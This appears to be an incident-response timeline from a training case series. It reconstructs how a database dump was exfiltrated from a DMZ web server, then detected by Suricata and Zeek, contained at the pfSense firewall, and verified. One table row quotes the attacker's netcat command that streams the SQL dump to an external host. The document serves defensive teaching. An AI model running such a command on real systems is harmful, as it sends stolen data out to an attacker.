# Case 005 — Chronological Timeline Reconstruction

This document reconstructs the timeline of DMZ data exfiltration, detection firing, emergency containment, and post-incident firewall verification across `WEB01` (`10.10.34.13`) and `PFSENSE-01` (`10.10.36.10`). All timestamps are indexed relative to $T_0$ (Case 001 reverse shell establishment).

---

## 1. Chronological Timeline Table

| Relative Time | Source Subsystem | Event / Detection ID | Observed Telemetry Evidence (Facts Only) | Analytical Interpretation |
| :--- | :--- | :--- | :--- | :--- |
| **$T_0 + 11\text{m } 58\text{s}$** | `WEB01` Filesystem | Case 004 Context | File created: `/tmp/_6f9beb897020ebe5.sql.gz` (4.1 MB). | Database dump complete; staging file ready for transmission. |
| **$T_0 + 12\text{m } 15\text{s}$** | `WEB01` Linux Shell | Host Bash Audit | Command executed: `nc 203.0.113.25 9999 < /tmp/_6f9beb897020ebe5.sql.gz`. | Attacker initiates raw TCP exfiltration stream over port 9999 to external Kali machine. |
| **$T_0 + 12\text{m } 16\text{s}$** | `SURICATA-IPS01` | `A13` | Suricata EVE JSON: SID `1101021`, alert from `10.10.34.13:54210` to `203.0.113.25:9999`, action: `allowed`. | Suricata IPS signature matches high-volume DMZ outbound transfer; alert generated. |
| **$T_0 + 12\text{m } 19\text{s}$** | `ZEEK-SENSOR01` | NDR Metadata | Zeek flow completes: `orig_bytes = 4,194,304` (4.19 MB), elapsed duration = 3.42s. | Exfiltration data transfer completes prior to manual human containment. |
| **$T_0 + 12\text{m } 30\text{s}$** | `ARCSIGHT-ESM` | Alert Triage | Active Channel displays Severity 10 Alert `A13`; Tier-2 analyst initiates containment runbook. | Immediate incident escalation: analyst mobilizes perimeter firewall and host response. |
| **$T_0 + 14\text{m } 00\text{s}$** | `PFSENSE-01` | Containment | Administrator applies firewall rule: `BLOCK TCP from DMZ/LAN to ANY port 9999`. | Perimeter egress filter applied to sever external data exfiltration pathway. |
| **$T_0 + 14\text{m } 30\text{s}$** | `WEB01` Host | Containment | Administrator executes `pkill nc`, terminates `pts/1` SSH session, and deletes `/tmp/*.sql*`. | Attacker processes eradicated from `WEB01`; staged dump files purged from disk. |
| **$T_0 + 15\text{m } 10\text{s}$** | `PFSENSE-01` | Validation | Filterlog: `10.10.34.13:54212 -> 203.0.113.25:9999`, `action=block`, rule: `Default Deny Egress 9999`. | Telemetry validates that post-containment attempts to reconnect on port 9999 are dropped. |

---

## 2. Chronological Analysis
* **Exfiltration Velocity**: The entire 4.19 MB archive was streamed in **3.42 seconds** over raw TCP, highlighting the operational challenge of manual intervention when sensors are deployed in passive/alert-only mode.
* **Containment Execution**: Total elapsed time from alert trigger ($T+12\text{m } 16\text{s}$) to complete firewall egress block ($T+14\text{m } 00\text{s}$) was **1 minute and 44 seconds**.
